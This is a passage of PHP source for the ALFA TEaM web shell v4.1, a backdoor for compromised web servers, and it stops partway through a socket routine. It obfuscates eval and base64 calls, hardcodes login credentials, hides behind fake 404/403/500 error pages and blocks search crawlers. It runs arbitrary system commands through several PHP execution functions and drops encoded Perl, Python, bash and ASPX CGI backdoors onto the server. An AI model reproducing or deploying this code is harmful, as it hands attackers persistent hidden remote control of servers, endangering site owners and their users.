<?php

$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'Cvar1984',
    'password' => 'e00b29d5b34c3f78df09d45921c9ec47',
    'safe_mode' => '1',
    'login_page' => '404',
    'show_icons' => '1',
    'post_encryption' => true,
    'cgi_api' => false,
);

$CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
$aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
$OVpGNqqFZs = 'e' . 'v' . 'al';
$psDEwGhsxg = 'gz' . 'inf' . 'late';

if (!$CWppUDJxuf('b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . ''))
{
    function vcnvSCZgBz($data)
    {
        if (empty($data)) return;
        $b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        $o1 = $o2 = $o3 = $h1 = $h2 = $h3 = $h4 = $bits = $i = 0;
        $ac = 0;
        $enc = '';
        $tmp_arr = array();
        if (!$data)
        {
            return $data;
        }
        do
        {
            $o1 = $aztJtafUXm($data, $i++);
            $o2 = $aztJtafUXm($data, $i++);
            $o3 = $aztJtafUXm($data, $i++);
            $bits = $o1 << 16 | $o2 << 8 | $o3;
            $h1 = $bits >> 18 & 0x3f;
            $h2 = $bits >> 12 & 0x3f;
            $h3 = $bits >> 6 & 0x3f;
            $h4 = $bits & 0x3f;
            $tmp_arr[$ac++] = charAt($b64, $h1) . charAt($b64, $h2) . charAt($b64, $h3) . charAt($b64, $h4);
        }
        while ($i < strlen($data));
        $enc = implode($tmp_arr, '');
        $r = (strlen($data) % 3);
        return ($r ? substr($enc, 0, ($r - 3)) : $enc) . substr('===', ($r || 3));
    }
    function charCodeAt($data, $char)
    {
        return ord(substr($data, $char, 1));
    }
    function charAt($data, $char)
    {
        return substr($data, $char, 1);
    }
}
else
{
    function vcnvSCZgBz($s)
    {
        $b = 'b' . 'a' . 'se64' . '_en' . 'c' . 'ode' . '';
        return $b($s);
    }
}
if (!$CWppUDJxuf('b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . ''))
{
    function zRtSHsbTzV($input)
    {
        if (empty($input)) return;
        $keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        $chr1 = $chr2 = $chr3 = "";
        $enc1 = $enc2 = $enc3 = $enc4 = "";
        $i = 0;
        $output = "";
        $input = preg_replace("[^A-Za-z0-9\+\/\=]", "", $input);
        do
        {
            $enc1 = strpos($keyStr, substr($input, $i++, 1));
            $enc2 = strpos($keyStr, substr($input, $i++, 1));
            $enc3 = strpos($keyStr, substr($input, $i++, 1));
            $enc4 = strpos($keyStr, substr($input, $i++, 1));
            $chr1 = ($enc1 << 2) | ($enc2 >> 4);
            $chr2 = (($enc2 & 15) << 4) | ($enc3 >> 2);
            $chr3 = (($enc3 & 3) << 6) | $enc4;
            $output = $output . chr((int)$chr1);
            if ($enc3 != 64)
            {
                $output = $output . chr((int)$chr2);
            }
            if ($enc4 != 64)
            {
                $output = $output . chr((int)$chr3);
            }
            $chr1 = $chr2 = $chr3 = "";
            $enc1 = $enc2 = $enc3 = $enc4 = "";
        }
        while ($i < strlen($input));
        return $output;
    }
}
else
{
    function zRtSHsbTzV($s)
    {
        $b = 'b' . 'a' . 'se' . '6' . '4' . '_d' . 'ecod' . 'e' . '';
        return $b($s);
    }
}

function __ZW5jb2Rlcg($s)
{
    return vcnvSCZgBz($s);
}
function __ZGVjb2Rlcg($s)
{
    return zRtSHsbTzV($s);
}

$GLOBALS['DB_NAME'] = $GLOBALS['oZgNypoPRU'];

foreach ($GLOBALS['DB_NAME'] as $key => $value)
{
	$prefix = substr($key, 0, 2);
	if ($prefix == "us")
	{
		$GLOBALS['DB_NAME']["user"] = $value;
		$GLOBALS['DB_NAME']["user_rand"] = $key;
	}
	elseif ($prefix == "pa")
	{
		$GLOBALS['DB_NAME']["pass"] = $value;
		$GLOBALS['DB_NAME']["pass_rand"] = $key;
	}
	elseif ($prefix == "sa")
	{
		$GLOBALS['DB_NAME']["safemode"] = $value;
		$GLOBALS['DB_NAME']["safemode_rand"] = $key;
	}
	elseif ($prefix == "lo")
	{
		$GLOBALS['DB_NAME']["login_page"] = $value;
		$GLOBALS['DB_NAME']["login_page_rand"] = $key;
	}
	elseif ($prefix == "sh")
	{
		$GLOBALS['DB_NAME']["show_icons"] = $value;
		$GLOBALS['DB_NAME']["show_icons_rand"] = $key;
	}
	elseif ($prefix == "po")
	{
		$GLOBALS['DB_NAME']["post_encryption"] = $value;
		$GLOBALS['DB_NAME']["post_encryption_rand"] = $key;
	}
	elseif ($prefix == "cg")
	{
		$GLOBALS['DB_NAME']["cgi_api"] = $value;
		$GLOBALS['DB_NAME']["cgi_api_rand"] = $key;
	}
}

unset($GLOBALS['oZgNypoPRU']);

if (!isset($_SERVER["HTTP_HOST"])) exit();

if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
if(!isset($GLOBALS['DB_NAME']['safemode']))exit('$GLOBALS[\'DB_NAME\'][\'safemode\']');
if(!isset($GLOBALS['DB_NAME']['login_page']))exit('$GLOBALS[\'DB_NAME\'][\'login_page\']');
if(!isset($GLOBALS['DB_NAME']['show_icons']))exit('$GLOBALS[\'DB_NAME\'][\'show_icons\']');
if(!isset($GLOBALS['DB_NAME']['post_encryption']))exit('$GLOBALS[\'DB_NAME\'][\'post_encryption\']');
define("__ALFA_VERSION__", "4.1");
define("__ALFA_UPDATE__", "2");
define("__ALFA_CODE_NAME__", "Tesla");
define("__ALFA_DATA_FOLDER__", "ALFA_DATA");
define("__ALFA_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
define("__ALFA_SECRET_KEY__", __ALFA_POST_ENCRYPTION__?_AlfaSecretKey():'');
$GLOBALS['__ALFA_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".header" => "border: 7px solid {color}",
				"#meunlist" => "border-color: {color}",
				"#hidden_sh" => "background-color: {color}",
				".ajaxarea" => "border: 1px solid {color}",
				".foot" => "border-color: {color}",
			)
		),
		"header_vars" => "#27979B",
		"header_values" => "#67ABDF",
		"header_on" => "#00FF00",
		"header_off" => "#ff0000",
		"header_none" => "#00FF00",
		"home_shell" => "#ff0000",
		"home_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".home_shell:hover" => "color: {color};",
			)
		),
		"back_shell" => "#efbe73",
		"back_shell:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".back_shell:hover" => "color: {color};",
			)
		),
		"header_pwd" => "#00FF00",
		"header_pwd:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_pwd:hover" => "color: {color};",
			)
		),
		"header_drive" => "#00FF00",
		"header_drive:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".header_drive:hover" => "color: {color};",
			)
		),
		"header_show_all" => "#00FF00",
		"disable_functions" => "#ff0000",
		"footer_text" => "#27979B",
		"menu_options" => "#27979B",
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"options_list" => array(
			"key_color" => "#00FF00",
			"multi_selector" => array(
				".content_options_holder .header center a" => "color: {color};",
			)
		),
		"options_list:hover" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".content_options_holder .header center a:hover" => "color: {color};",
			)
		),
		"options_list_header" => array(
			"key_color" => "#59cc33",
			"multi_selector" => array(
				".txtfont_header" => "color: {color};",
			)
		),
		"options_list_text" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".txtfont,.tbltxt" => "color: {color};",
			)
		),
		"Alfa+" => array(
			"key_color" => "#06ff0f",
			"multi_selector" => array(
				".alfa_plus" => "color: {color};font-weight: unset;",
			)
		),
		"hidden_shell_text" => array(
			"key_color" => "#00FF00",
			"multi_selector" =>array(
				"#hidden_sh a" => "color: {color};",
			)
		),
		"hidden_shell_version" => "#ff0000",
		"shell_name" => "#FF0000",
		"main_row:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".main tr:hover" => "background-color: {color};",
			)
		),
		"main_header" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main th" => "color: {color};",
			)
		),
		"main_name" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .main_name" => "color: {color};font-weight: unset;",
			)
		),
		"main_size" => "#67ABDF",
		"main_modify" => "#67ABDF",
		"main_owner_group" => "#67ABDF",
		"main_green_perm" => "#25ff00",
		"main_red_perm" => "#FF0000",
		"main_white_perm" => "#FFFFFF",
		"beetween_perms" => "#FFFFFF",
		"main_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".main .actions" => "color: {color};",
			)
		),
		"menu_options:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".menu_options:hover" => "background-color: {color};font-weight: unset;",
			)
		),
		"minimize_editor_background" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".minimized-wrapper" => "background-color: {color};",
			)
		),
		"minimize_editor_text" => array(
			"key_color" => "#f5deb3",
			"multi_selector" => array(
				".minimized-text" => "color: {color};",
			)
		),
		"editor_border" => array(
			"key_color" => "#0e304a",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "border: 2px solid {color};",
			)
		),
		"editor_background" => array(
			"key_color" => "rgba(0, 1, 23, 0.94)",
			"multi_selector" => array(
				".editor-explorer,.editor-modal" => "background-color: {color};",
			)
		),
		"editor_header_background" => array(
			"key_color" => "rgba(21, 66, 88, 0.93)",
			"multi_selector" => array(
				".editor-header" => "background-color: {color};",
			)
		),
		"editor_header_text" => array(
			"key_color" => "#00ff7f",
			"multi_selector" => array(
				".editor-path" => "color: {color};",
			)
		),
		"editor_header_button" => array(
			"key_color" => "#1d5673",
			"multi_selector" => array(
				".close-button, .editor-minimize" => "background-color: {color};",
			)
		),
		"editor_actions" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_actions" => "color: {color};",
			)
		),
		"editor_file_info_vars" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".editor_file_info_vars" => "color: {color};",
			)
		),
		"editor_file_info_values" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".filestools" => "color: {color};",
			)
		),
		"editor_history_header" => array(
			"key_color" => "#14ff07",
			"multi_selector" => array(
				".hheader-text,.history-clear" => "color: {color};",
			)
		),
		"editor_history_list" => array(
			"key_color" => "#03b3a3",
			"multi_selector" => array(
				".editor-file-name" => "color: {color};",
			)
		),
		"editor_history_selected_file" => array(
			"key_color" => "rgba(49, 55, 93, 0.77)",
			"multi_selector" => array(
				".is_active" => "background-color: {color};",
			)
		),
		"editor_history_file:hover" => array(
			"key_color" => "#646464",
			"multi_selector" => array(
				".file-holder > .history:hover" => "background-color: {color};",
			)
		),
		"input_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"input[type=text],textarea" => "border: 1px solid {color}",
			)
		),
		"input_box_text" => array(
			"key_color" => "#999999",
			"multi_selector" => array(
				"input[type=text],textarea" => "color: {color};",
			)
		),
		"input_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=text]:hover,textarea:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"select_box_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				"select" => "border: 1px solid {color}",
			)
		),
		"select_box_text" => array(
			"key_color" => "#FFFFEE",
			"multi_selector" => array(
				"select" => "color: {color};",
			)
		),
		"select_box:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"select:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"button_border" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit],.button,#addup" => "border: 1px solid {color};",
			)
		),
		"button:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				"input[type=submit]:hover" => "box-shadow:0 0 4px {color};border:2px solid {color};",
				".button:hover,#addup:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"outputs_text" => array(
			"key_color" => "#67ABDF",
			"multi_selector" => array(
				".ml1" => "color: {color};",
			)
		),
		"outputs_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".ml1" => "border: 1px solid {color};",
			)
		),
		"uploader_border" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_background" => array(
			"key_color" => "#0E304A",
			"multi_selector" => array(
				".inputfile strong" => "background-color: {color};",
			)
		),
		"uploader_text_right" => array(
			"key_color" => "#FFFFFF",
			"multi_selector" => array(
				".inputfile strong" => "color: {color};",
			)
		),
		"uploader_text_left" => array(
			"key_color" => "#25ff00",
			"multi_selector" => array(
				".inputfile span" => "color: {color};",
			)
		),
		"uploader:hover" => array(
			"key_color" => "#27979B",
			"multi_selector" => array(
				".inputfile:hover" => "box-shadow:0 0 4px {color};border:1px solid {color};",
			)
		),
		"uploader_progress_bar" => array(
			"key_color" => "#00ff00",
			"multi_selector" => array(
				".up_bar" => "background-color: {color};",
			)
		),
		"mysql_tables" => "#00FF00",
		"mysql_table_count" => "#67ABDF",
		"copyright" => "#dfff00",
		"scrollbar" => array(
			"key_color" => "#1e82b5",
			"multi_selector" => array(
				"*::-webkit-scrollbar-thumb" => "background-color: {color};",
			)
		),
		"scrollbar_background" => array(
			"key_color" => "#000115",
			"multi_selector" => array(
				"*::-webkit-scrollbar-track" => "background-color: {color};",
			)
		),
);
$GLOBALS['__file_path'] = str_replace('\\','/',trim(preg_replace('!\(\d+\)\s.*!', '', __FILE__)));
$config = array('AlfaUser' => $GLOBALS['DB_NAME']['user'],'AlfaPass' => $GLOBALS['DB_NAME']['pass'],'AlfaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'AlfaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
//@session_start();
@session_write_close();
@ignore_user_abort(true);
@set_time_limit(0);
@ini_set('memory_limit', '-1');
@ini_set("upload_max_filesize", "9999m");
if($config['AlfaProtectShell']){
$SERVER_SIG = (isset($_SERVER["SERVER_SIGNATURE"])?$_SERVER["SERVER_SIGNATURE"]:"");
$Eform='<form method="post"><input style="margin:0;background-color:#fff;border:1px solid #fff;" type="password" name="password"></form>';
if($config['AlfaLoginPage'] == 'gui'){
if(@$_COOKIE["AlfaUser"] != $config['AlfaUser'] && $_COOKIE["AlfaPass"] != md5($config['AlfaPass'])){
if(@$_POST["usrname"]==$config['AlfaUser'] && @md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '
<style>
body{background: black;}
#loginbox { font-size:11px; color:green; right:85px; width:1200px; height:200px; border-radius:5px; -moz-boder-radius:5px; position:fixed; top:250px; }
#loginbox td { border-radius:5px; font-size:11px; }
</style>
<title>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ ALFA TEaM Shell-v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ~</b></font></th></tr>
<tr><td bgcolor="black" style="padding:5">
<form method="post">
<input type="hidden" name="action" value="login">
<input type="hidden" name="hide" value="">
<center><table>
<tr><td><font color="green" face="verdana,arial" size=-1>Login:</font></td><td><input type="text" size="30" name="usrname" placeholder="username" onfocus="if (this.value == \'username\'){this.value = \'\';}"></td></tr>
<tr><td><font color="green" face="verdana,arial" size=-1>Password:</font></td><td><input type="password" size="30" name="password" placeholder="password" onfocus="if (this.value == \'password\') this.value = \'\';"></td></tr>
<tr><td><font face="verdana,arial" size=-1>&nbsp;</font></td><td><font face="verdana,arial" size=-1><input type="submit" value="Login"></font></td></tr></table>
</div><br /></center>';
exit;
}
}elseif($config['AlfaLoginPage']=='500'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo '<html><head><title>500 Internal Server Error</title></head><body><h1>Internal Server Error</h1><p>The server encountered an internal error or misconfiguration and was unable to complete your request.</p><p>Please contact the server administrator, '.$_SERVER['SERVER_ADMIN'].' and inform them of the time the error occurred, and anything you might have done that may have caused the error.</p><p>More information about this error may be available in the server error log.</p><hr>'.$SERVER_SIG.'</body></html>'.$Eform;
exit;
}
}elseif($config['AlfaLoginPage']=='403'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You don't have permission to access ".$_SERVER['PHP_SELF']." on this server.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}elseif($config['AlfaLoginPage']=='404'){
if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
if(@md5($_POST["password"])==$config['AlfaPass']){
__alfa_set_cookie("AlfaUser", $config['AlfaUser']);
__alfa_set_cookie("AlfaPass", @md5($config['AlfaPass']));
@header('location: '.$_SERVER["PHP_SELF"]);
}
echo "<title>404 Not Found</title><h1>Not Found</h1><p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.<br><br>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p><hr>".$SERVER_SIG."</body></html>".$Eform;
exit;
}
}
}
function decrypt_post($str){
	if(__ALFA_POST_ENCRYPTION__){
		$pwd = __ALFA_SECRET_KEY__;
		$pwd     = __ZW5jb2Rlcg($pwd);
		$str     = __ZGVjb2Rlcg($str);
		$enc_chr = "";
		$enc_str = "";
		$i       = 0;
		while ($i < strlen($str)) {
			for ($j = 0; $j < strlen($pwd); $j++) {
				$enc_chr = chr(ord($str[$i]) ^ ord($pwd[$j]));
				$enc_str .= $enc_chr;
				$i++;
				if ($i >= strlen($str))
					break;
			}
		}
		return __ZGVjb2Rlcg($enc_str);
	}else{
		return __ZGVjb2Rlcg($str);
	}
}

function _AlfaSecretKey(){
	$secret = @$_COOKIE["AlfaSecretKey"];
	if(!isset($_COOKIE["AlfaSecretKey"])){
		$secret = uniqid(mt_rand(), true);
		__alfa_set_cookie("AlfaSecretKey", $secret);
	}
	return $secret;
}
function alfa_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__ALFA_COLOR__"][$target];
		if(is_array($target)){
			return $target["key_color"];
		}else{
			return $target;
		}
	}
}
function alfaCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__ALFA_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = alfa_getColor($key);
			$css .= ".{$key}{color: {$value};}";
		}else{
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){
					$color = alfa_getColor($key);
					$code = str_replace("{color}", $color, $v);
					$css .=  $k."{".$code."}";
				}
			}
		}
	}
	return $css;
}
if(isset($_POST['ajax'])){
function AlfaNum(){
$args = func_get_args();
$alfax = array();
$find = array();
for($i=1;$i<=10;$i++){
$alfax[] = $i;
}
foreach($args as $arg){
$find[] = $arg;
}
echo '<script>';
foreach($alfax as $alfa){
if(in_array($alfa,$find))
continue;
echo 'alfa'.$alfa."_=";
}
echo '""</script>';
}}
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	if(!$GLOBALS["DB_NAME"]["cgi_api"]){
		return "";
	}
	if(isset($_COOKIE["alfacgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	$is_curl = function_exists('curl_version');
	$is_socket = function_exists('fsockopen');
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["alfacgiapi"])){
			if(!@file_exists("alfacgiapi/".$_COOKIE["alfacgiapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["alfacgiapi"];
			}
		}
		if(!isset($_COOKIE["alfacgiapi"])||$recreate){
			@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
			$perl = 'jZFRT8IwFIXf/RXXOqWNsKoxPlAwRliERIbK9EUMGdsFGrYyt2Iky/ztdkMlJj74cpKee853k96Dfb7OUj6ViieYRgDQ6FdOtAr8iE99FcZS7a0zhEF/4DSb136GF+ciSaXSQDorpVHpht4k2ASN75ovdByN1VgRIWfUctynvPbg3D86I28ycLzesFsrAF+B3A1HHmF5vAFqyTpYS9wYffMjo1IxkaIf0pHX7buVYaRidYau57je5NZxb7xerWDiSipoQ5ZEUlN+xL/qs5UBBAvzAHoCtg3WgbFzM3u25Au0PyDj42MOfC7objfbkdpbUpmuwxkTZWhbO6S2zXjiB0tKAlKHBb5T65QxPkdRQv6RkioveQXYbSDjEwJyBjTEmVQY0p8pY7+TJVwU5bcalwRxSAqWby8RYrAKcTKtrvM1X2CwNAmbtJIUL4nINpnGmP4VrVDs+6otXhWK4hM=';
			$py = "bZDBS8MwGMXPy19R66EtzhRk7DA3L1rxItOt3gajTb6twTQJydexIf7vJqvMiR5CyHvv93jk8iLvnM1roXJzwEYrgvYwIQPRGm0xYluB9W1/UVBVLSHNCOwZGPQpUzlHvqPaDX1sWFcOxiOy0baNZgGkjwIkX6K21RZSUDthtZp9JIvi9a1YluvnonyaPyST5GW+LJPPjLCWezIU0C3grpIdpIkXE281wN7/MYPsbWOFwii+1wpB4TUeDEwQ9pg32MqVXalwYiI2ka8L84/5fjGtxyMOTHNIj3XZVTw1Fu5iMmCNkHztkAs1jE4P3aFfoh012oC6Sf/WtDzLftGUSe3CBw4suE4G/ryOWqh4eo4E8cT0a3uSOrTC/KjxND+O/QI=";
			$bash = "rVRdj5pAFH2uv+I6DGa1Iaybpg9amrRboptYbV360JQGWRiFyPI5WreU/95hoCyjsfFh52nm3nM/zuTcK3XVBz9UH+zM6xDHi0AhgG6jkJKQKvQpJiOg5EBVjz4GZmiGqLPehQ71oxCcjW9tCLW+LO4Na2+n2VU/7wA7PwDhpf71m87sn3VjuviEoKsBKoEIfkKvBymhuzSs0V1QfrMQFrD8bt0by7v5xDqH5cjbxdzQ54Y10+cTYyrCXqXEdkGZwxEKTtLzjHVUIdJyiRO5hHF6poQlUEICw5OegsixA9gDBY+/qYZwPlTV1yoUsoy47ZfnB6RMkku0AGVD4RoUmzHJaVH9jcxYjMGNOLw8+zLNvmAIWTblQYEaDy9ApYHcsvnrC7JTj4RNRHk8jUFG16ObQjBXBZgVCea6I7T6pxOTnQPOvWLV4NY+v7pRSPiFQ6uw/3w3U5Gon/KzAwo3Zz47gRi27MszbnPsjAAegv9MbqIbfaH3RmR5WwZFLZ1EO3b0ROrjcfMslSPmPpmDCypz8Nnylfd8Dx8XxvRF+b0MhaS4nAbJbIdfMs9f0+qmIcADECemrpwcj0fMC8pyrz0Z29IYy7LWNnLZxtJAa9mqdiUcC+Hl3hoiYPPyYTZDoHDlZirgLaj1IOGsJmwKpMghjlLK3FukoZWwQcBEeG+iFRIHoxmElv65toDV7iQ7kj5p+IqPD3YeXfgDbEWTt29AUarU/WpdNxiPONuzqHKpv4tT8t50UId1FbBdwWsULb9aA/4C";
			$aspx = "jZNda9swFIavk18hNAoOAXdsozdLyrrUKYaRlriNN0IuFPvEFbUl70jOB2P97T1SPBo8ynZlS+d53/Ph49HZF3YnCmDfhCoaehnzyTvOIiXWJSwk7BIrLF1uRGmAs7PL/ogUcVVrtGwmKjC1yCieHIyFKkxhHT7E7jHRyqIuzb8111IUShsrs/+A41vPENTvGYtSFSyrcjZmc/jZgLHhVGO15HTHV59fkUfInv6G3K3H5CZokTHj6cfZdn2z+CC+z+of1b7cVNOdWLwf88Gvfq+3PlhYrlgurCDDtipqdgtIvqirr8LAxafEJw6ojgH59441tvQ97G14lUziOFKZzok7nsIbsK3O2ZOQlHeoMzCG1aRXsGPtOfC2dUifB22sNjqcINCXmulUqlzviLbYQBeayhLcUCnsZhTCHniXucKiqUBZ46DzjHE2dDPuYg8Gkkcoy2gPWWOdo9+RLjaHXCJk1JhQucD8trF1Y98orwtHiBrfYFONTzSqay/QePDVnjYTHAfYroD+k9dHT0qhpCK/15HKgwF1+hr2yU+jzntO+6iVgTBFaSHgS6NL2Eoj6Xd5FrVcjWqESz48phvy0bk/O+3vPi3uCw==";
			if($lang=="perl")$source = $perl;elseif($lang=="py")$source = $py;else $source = $bash;
			if($lang == "aspx"){
				alfaWriteTocgiapi("aspx.aspx",$aspx);
			}else{
				alfaWriteTocgiapi($lang.".alfa",$source);
			}
			alfacgihtaccess('cgi', "alfacgiapi/");
		}else{
			$lang = $_COOKIE["alfacgiapi"];
		}
		$cgi_ext = ".alfa";
		if($lang=="aspx"){
			$cgi_ext=".aspx";
		}
		$cgi_url = __ALFA_DATA_FOLDER__."/alfacgiapi/".$lang.$cgi_ext;
		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$post = new AlfaCURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname($_SERVER["REQUEST_URI"])."/".$cgi_url;
			$data = _alfa_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("alfacgiapi", $lang);
			}
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
			return _alfa_cgicmd($cmd_pure,"py",$set_cookie);
		}elseif($lang=="py"){
			return _alfa_cgicmd($cmd_pure,"bash",$set_cookie);
		}elseif($lang=="bash" && $GLOBALS['sys']=="win"){
			return _alfa_cgicmd($cmd_pure,"aspx",$set_cookie);
		}else{
			if($set_cookie){
				__alfa_set_cookie("alfacgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
		return "";
	}
}
function alfaGetCwd(){
	if(function_exists("getcwd")){
		return @getcwd();
	}else{
		return dirname($_SERVER["SCRIPT_FILENAME"]);
	}
}
function alfaEx($in,$re=false,$cgi=true,$all=false){
	$data = _alfa_php_cmd($in,$re);
	if(empty($data)&&$cgi||$all){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_alfa_php_cmd("whoami"))==0||$all){
				$cmd = _alfa_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
			}
		}
	}
	return $data;
}
function _alfa_php_cmd($in,$re=false){
$out='';
if($re)$in=$in." 2>&1";
if(function_exists('exec')){
@exec($in,$out);
$out = @join("\n",$out);
}elseif(function_exists('passthru')) {
ob_start();
@passthru($in);
$out = ob_get_clean();
}elseif(function_exists('system')){
ob_start();
@system($in);
$out = ob_get_clean();
} elseif (function_exists('shell_exec')) {
$out = shell_exec($in);
}elseif(function_exists("popen")&&function_exists("pclose")){
if(is_resource($f = @popen($in,"r"))){
$out = "";
while(!@feof($f))
$out .= fread($f,1024);
pclose($f);
}
}elseif(function_exists('proc_open')){
$pipes = array();
$process = @proc_open($in.' 2>&1', array(array("pipe","w"), array("pipe","w"), array("pipe","w")), $pipes, null);
$out=@stream_get_contents($pipes[1]);
}elseif(class_exists('COM')){
$alfaWs = new COM('WScript.shell');
$exec = $alfaWs->exec('cmd.exe /c '.$_POST['alfa1']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
return $out;
}
function _alfa_fsockopen($server,$uri,$post){
	$socket = @fsockopen($server, 80, $errno, $errstr, 15);
	if($socket){
		$http  = "POST {$uri} HTTP/1.0\r\n";
		$http .= "Host: {$server}\r\n";
		$http .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
		$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
		$http .= "Content-length: " . strlen($post) . "\r\n";
		$http .= "Connection: close\r\n\r\n";
